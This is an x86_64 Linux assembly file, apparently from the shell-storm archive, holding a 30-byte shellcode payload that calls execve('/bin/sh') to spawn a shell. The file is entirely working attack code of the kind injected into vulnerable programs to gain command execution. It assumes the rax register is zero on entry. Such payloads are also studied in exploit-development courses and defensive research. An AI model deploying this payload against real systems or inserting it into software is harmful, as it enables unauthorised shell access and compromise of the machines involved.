; Linux/x86_64 execve("/bin/sh"); 30 bytes shellcode
; Date: 2010-04-26
; Author: zbt
; Tested on: x86_64 Debian GNU/Linux
; http://shell-storm.org/shellcode/files/shellcode-603.php
 
; execve("/bin/sh", ["/bin/sh"], NULL)

section .text
	global _start

_start:
    	xor     rdx, rdx
    	mov     qword rbx, '//bin/sh'
    	shr     rbx, 0x8
    	push    rbx
    	mov     rdi, rsp
    	push    rax
    	push    rdi
    	mov     rsi, rsp
    	mov     al, 0x3b
    	syscall
